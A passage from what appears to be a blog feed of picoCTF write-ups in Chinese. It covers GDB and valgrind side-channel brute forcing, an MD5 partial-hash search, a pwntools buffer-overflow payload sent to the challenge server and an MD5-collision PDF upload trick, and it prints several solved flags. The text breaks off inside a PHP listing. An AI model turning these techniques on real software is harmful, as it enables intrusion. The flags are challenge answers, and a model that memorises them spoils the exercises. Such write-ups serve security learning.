$rsi</code>看<code>$rsi</code>的值 </p><blockquote><p>flag: picoCTF{dyn4m1c_4n4ly1s_1s_5up3r_us3ful_14bfa700}</p></blockquote><h1 id="Easy-as-GDB-160-points"><a href="#Easy-as-GDB-160-points" class="headerlink" title="Easy as GDB [160 points]"></a>Easy as GDB [160 points]</h1><p>可以看到這個function會返回正確的字母數</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gef➤  r</span><br><span class="line">input the flag: p</span><br><span class="line">gef➤  x/x <span class="variable">$ebp</span>-0x14</span><br><span class="line">0xffffd294:0x00000001</span><br><span class="line">gef➤  r</span><br><span class="line">input the flag: pi</span><br><span class="line">gef➤  x/x <span class="variable">$ebp</span>-0x14</span><br><span class="line">0xffffd294:0x00000002</span><br><span class="line">gef➤  r</span><br><span class="line">input the flag: picoCTF&#123;</span><br><span class="line">gef➤  x/x <span class="variable">$ebp</span>-0x14</span><br><span class="line">0xffffd294:0x00000008</span><br></pre></td></tr></table></figure><p>用pwntool寫一個暴力破解程式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;gdb-gef&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;file ./brute&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;gef&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;b *0x565559a7&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvuntil(<span class="string">&quot;gef&quot;</span>))</span><br><span class="line">alphabet = string.printable</span><br><span class="line">flag = <span class="string">&quot;picoCTF&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">        p.sendline(<span class="string">&quot;run&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Starting program&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;trying &quot;</span> + flag + c)</span><br><span class="line">        p.sendline(flag + c)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;gef&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;x/x $ebp-0x14&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;0xffff&quot;</span>)</span><br><span class="line">        count = <span class="built_in">int</span>(p.recvline().split()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="built_in">len</span>(flag):</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ARMssembly-4-170-points"><a href="#ARMssembly-4-170-points" class="headerlink" title="ARMssembly 4 [170 points]"></a>ARMssembly 4 [170 points]</h1><p>和前面幾題都一樣，跑起來傳值就完事，<del>已經變template了</del></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cross-Compile and Link</span></span><br><span class="line">$(aarch64-linux-gnu-as -o chall_4.o chall_4.S)</span><br><span class="line">$(aarch64-linux-gnu-gcc -o chall_4.elf chall_4.o)</span><br><span class="line">$(<span class="built_in">chmod</span> +x chall_4.elf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run</span></span><br><span class="line">output=$(qemu-aarch64 ./chall_4.elf 2907278761 | grep -o <span class="string">&#x27;[0-9]*&#x27;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Flag: picoCTF&#123;<span class="subst">$(printf <span class="string">&quot;%08x&quot;</span> $output)</span>&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Powershelly-180-points"><a href="#Powershelly-180-points" class="headerlink" title="Powershelly [180 points]"></a>Powershelly [180 points]</h1><p>這題有點通靈 BJ4了</p><h1 id="Rolling-My-Own-300-points"><a href="#Rolling-My-Own-300-points" class="headerlink" title="Rolling My Own [300 points]"></a>Rolling My Own [300 points]</h1><p>先用IDA 反編譯看main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-F8h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-F8h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+Ch] [rbp-F4h]</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v9)(__int64 (__fastcall *)()); <span class="comment">// [rsp+10h] [rbp-F0h]</span></span><br><span class="line">  _BYTE *ptr; <span class="comment">// [rsp+18h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v11[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-E0h]</span></span><br><span class="line">  __int64 v12[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-D0h]</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">48</span>]; <span class="comment">// [rsp+40h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+70h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">72</span>]; <span class="comment">// [rsp+B0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+F8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v13, <span class="string">&quot;GpLaMjEWpVOjnnmkRGiledp6Mvcezxls&quot;</span>);</span><br><span class="line">  v11[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">  v11[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">  v11[<span class="number">2</span>] = <span class="number">7</span>;</span><br><span class="line">  v11[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strlen</span>(s) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncat</span>(dest, &amp;s[<span class="number">4</span> * i], <span class="number">4uLL</span>);</span><br><span class="line">    <span class="built_in">strncat</span>(dest, &amp;v13[<span class="number">8</span> * i], <span class="number">8uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(dest);</span><br><span class="line">  sub_E3E(ptr, dest, v3);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">3</span>; ++k )</span><br><span class="line">      *((_BYTE *)v12 + <span class="number">4</span> * k + j) = ptr[<span class="number">16</span> * k + j + v11[k]];</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = (<span class="type">void</span> (__fastcall *)(__int64 (__fastcall *)()))mmap(<span class="number">0LL</span>, <span class="number">0x10</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = v12[<span class="number">1</span>];</span><br><span class="line">  *(_QWORD *)v9 = v12[<span class="number">0</span>];</span><br><span class="line">  *((_QWORD *)v9 + <span class="number">1</span>) = v4;</span><br><span class="line">  v9(sub_102B);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>從main中可以看到輸入被存到變數s中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Password: &quot;</span>);</span><br><span class="line">fgets(s, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">requiredBytes = [<span class="string">&quot;4889fe48&quot;</span>, <span class="string">&quot;bff126dc&quot;</span>, <span class="string">&quot;b3070000&quot;</span>, <span class="string">&quot;00ffd6&quot;</span>]</span><br><span class="line">offsets = [<span class="number">8</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">1</span>]</span><br><span class="line">requiredString = [<span class="string">&quot;GpLaMjEW&quot;</span>, <span class="string">&quot;pVOjnnmk&quot;</span>, <span class="string">&quot;RGiledp6&quot;</span>, <span class="string">&quot;Mvcezxls&quot;</span>]</span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line">password = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(requiredString), <span class="number">1</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="comment">#Generate 4 characters per iteration</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">123</span>, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">123</span>, <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">123</span>, <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">123</span>, <span class="number">1</span>):</span><br><span class="line">                    hashThis = <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d) + requiredString[x]</span><br><span class="line">                    result = hashlib.md5(hashThis.encode()).hexdigest()</span><br><span class="line">                    <span class="comment">#print(result)</span></span><br><span class="line">                    <span class="keyword">if</span> (result[offsets[x]*<span class="number">2</span>:offsets[x]*<span class="number">2</span>+<span class="built_in">len</span>(requiredBytes[x])] == requiredBytes[x]):</span><br><span class="line">                        password.append(hashThis)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Found smth!&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(hashThis[:<span class="number">4</span>])</span><br><span class="line">                        found = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> found:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> found:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">break</span>     </span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure><blockquote><p>flag: picoCTF{r011ing_y0ur_0wn_crypt0_15_h4rd!_3c22f4e9}</p></blockquote><h1 id="Checkpass-375-points"><a href="#Checkpass-375-points" class="headerlink" title="Checkpass [375 points]"></a>Checkpass [375 points]</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag_try_char = string.digits+string.ascii_letters+<span class="string">&quot;_&quot;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_instrucations</span>(<span class="params">flag</span>):</span><br><span class="line">    valgrind_stderr = process([    <span class="string">&quot;valgrind&quot;</span>, <span class="string">&quot;--tool=cachegrind&quot;</span>, <span class="string">&quot;./checkpass&quot;</span>, <span class="string">&quot;picoCTF&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>])</span><br><span class="line">    valgrind_stderr.recvuntil(<span class="string">&quot;I   refs:&quot;</span>)</span><br><span class="line">    answer = <span class="built_in">int</span>(valgrind_stderr.recvline().strip().decode().replace(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    valgrind_stderr.close()</span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_pass_index</span>(<span class="params">base_chr</span>):</span><br><span class="line">    <span class="keyword">global</span> best_count;</span><br><span class="line">    search_indexs = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>) <span class="keyword">if</span> collect_pass[i] == <span class="string">&quot;*&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> search_indexs:</span><br><span class="line">        try_pass = collect_pass[:i] + base_chr + collect_pass[i + <span class="number">1</span>:]</span><br><span class="line">        <span class="built_in">print</span>(try_pass)</span><br><span class="line">        count = count_instrucations(try_pass)</span><br><span class="line">        <span class="keyword">if</span> count &gt; best_count:</span><br><span class="line">            best_count = count</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;found an index: &quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> try_pass</span><br><span class="line"></span><br><span class="line">collect_pass = <span class="string">&quot;********************************&quot;</span></span><br><span class="line">best_count = count_instrucations(collect_pass)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;searching for necessary characters for verification...&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">any</span>(c == <span class="string">&quot;*&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> collect_pass):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> flag_try_char:</span><br><span class="line">        count = count_instrucations(collect_pass.replace(<span class="string">&quot;*&quot;</span>, c))</span><br><span class="line">        <span class="keyword">if</span> count &gt; best_count:</span><br><span class="line">            <span class="built_in">print</span>(c+<span class="string">&quot; is necessary for the next verification, searching for an index...&quot;</span>)</span><br><span class="line">            collect_pass = find_pass_index(c)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;approximate password: &quot;</span> + collect_pass + <span class="string">&quot;, continuing the search...&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">   </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;finished.&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF buffer overflow 0 [100 points]</title>
      <link href="/2023/12/25/CTF/picoCTF/Binary%20Exploitation/buffer%20overflow%200/2023-12-25-picoctf-buffer-overflow-0-%5B100-points%5D/"/>
      <url>/2023/12/25/CTF/picoCTF/Binary%20Exploitation/buffer%20overflow%200/2023-12-25-picoctf-buffer-overflow-0-%5B100-points%5D/</url>
      
        <content type="html"><![CDATA[<h1 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h1><p>points:100</p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote><p>Smash the stack Let’s start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using:</p></blockquote><h2 id="Hints"><a href="#Hints" class="headerlink" title="Hints"></a>Hints</h2><p><code>How can you trigger the flag to print?</code></p><p><code>If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren&#39;t expecting.</code></p><p><code>Run man gets and read the BUGS section. How many characters can the program really read?</code></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc vuln.c -m32 -fno-stack-protector -z noexecstack -o vuln</span><br></pre></td></tr></table></figure><p>看到 <code>sigsegv_handler function</code> 得知只要緩衝區溢位就能print出flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigsegv_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *input)</span>&#123;</span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">16</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>使用pwntools 送值</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;saturn.picoctf.net&quot;</span>,<span class="number">55984</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;payload:<span class="subst">&#123;payload&#125;</span>&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;flag:<span class="subst">&#123;r.recv()&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag:</code>picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF It is my Birthday [100 points]</title>
      <link href="/2023/12/24/CTF/picoCTF/Web%20Exploitation/It%20is%20my%20Birthday/posts/"/>
      <url>/2023/12/24/CTF/picoCTF/Web%20Exploitation/It%20is%20my%20Birthday/posts/</url>
      
        <content type="html"><![CDATA[<h1 id="It-is-my-Birthday"><a href="#It-is-my-Birthday" class="headerlink" title="It is my Birthday"></a>It is my Birthday</h1><p>points:100</p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><blockquote><p>I sent out 2 invitations to all of my friends for my birthday! I’ll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn’t believe how long it took me to find a collision. Anyway, see if you’re invited by submitting 2 PDFs to my website. <a href="http://mercury.picoctf.net:50970/">http://mercury.picoctf.net:50970/</a></p></blockquote><h1 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h1><blockquote><p>Look at the category of this problem.<br>How may a PHP site check the rules in the description?</p></blockquote><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>一進來網頁後看到可以上傳檔案，根據題目的提示似乎要檢查上傳pdf檔且md5值要一致<br><img src="https://i.imgur.com/2z0vgIQ.png" alt="Image"></p><blockquote><p>思路：自己產出一個兩個不同的字串但有相同的 PREFIX 和相同的 md5 值的檔案且副檔名要為pdf</p></blockquote><p>首先先安裝fastcoll這個工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libboost-filesystem-dev libboost-program-options-dev </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/brimstone/fastcoll.git</span><br><span class="line"><span class="built_in">cd</span> fastclone</span><br><span class="line">g++ -O3 *.cpp -lboost_filesystem -lboost_program_options -lboost_system -o fastcoll -static &amp;&amp; strip fastcoll</span><br></pre></td></tr></table></figure><p>執行完後會在當前目錄產生fastoll執行檔，之後創建任意一個檔案當作prefix標準</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> ntust</span><br></pre></td></tr></table></figure><p>使用指令產出兩個pdf檔案(兩個不同的字串但有相同的 PREFIX 和相同的 md5 值的檔案)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fastcoll -p ntust -o ../1.pdf ../2.pdf</span><br></pre></td></tr></table></figure><p>把檔案丟上去並送出，拿到此php source code</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$type1</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file1&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="variable">$type2</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file2&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="variable">$size1</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file1&quot;</span>][<span class="string">&quot;size&quot;</span>];</span><br><span class="line">    <span class="variable">$size2</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file2&quot;</span>][<span class="string">&quot;size&quot;</span>];</span><br><span class="line">    <span class="variable">$SIZE_LIMIT</span> = <span class="number">18</span> * <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$size1</span> &lt; <span class="variable">$SIZE_LIMIT</span>) &amp;&amp; (<span class="variable">$size2</span> &lt; <span class="variable">$SIZE_LIMIT</span>)) &#123;</span><br><span class="line">        <span 